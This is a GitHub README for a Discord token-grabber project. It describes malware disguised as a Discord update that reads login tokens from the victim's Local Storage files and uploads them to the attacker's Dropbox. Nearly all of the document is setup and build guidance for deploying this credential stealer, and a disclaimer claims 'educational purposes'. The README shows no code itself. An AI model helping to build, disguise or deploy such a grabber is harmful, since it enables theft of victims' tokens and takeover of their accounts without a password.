# Dropbox Discord Token Grabber
## NEW PROJECT!!4! --> **[WebhookDiscordTokenGrabber](https://github.com/iklevente/WebhookDiscordTokenGrabber)**

This Discord token grabber is able to get and upload any token from the .ldb and .log files in your Discord's Local Storage folder. You can login with the Discord tokens to the owner's account without a password. [Click here for how to login with it.](https://www.youtube.com/watch?v=FmXMGCRpw50) 

The program looks like a Discord Update, but it actually gets the tokens from the victim's discord app and uploads it to the given Dropbox account.

## Steps:
 - Get a Dropbox account
 - Go to dropbox.com/developers and create a new app.
 - Chose Dropbox API and give it full access. You can name it to anything you like.
 - Generate a new Dropbox access token and paste it in the project to Grabbing.cs line 25. (string DropboxToken)
 - Save the solution, exit from Visual Studio, delete the bin and obj files, restart and build the solution (**This is important because Dropbox API has a bug and sometimes it wants to use the previous token no matter you changed it.**)
 - Build your app and you are ready. (**The generated .dll files with the executable are necessary. You may want to make a self extractor executable, if you want it to be only an .exe file. You may also want to "Restore NuGet packages." in Visual Studio.**)

## Huge thanks to:
 - [NYAN CAT](https://github.com/NYAN-x-CAT/Discord-Token-Grabber) +rep 🍺
 - iLinked +rep 🍺 (R.I.P. GitHub profile 😢)

 ## Buy me a coffee ☕:
**[PayPal](https://www.paypal.me/iklevi)**

## Ps.:
**I am not responsible for anything you are doing with this project. I made this project for educational purposes.**

*This project is licensed under the MIT License.*
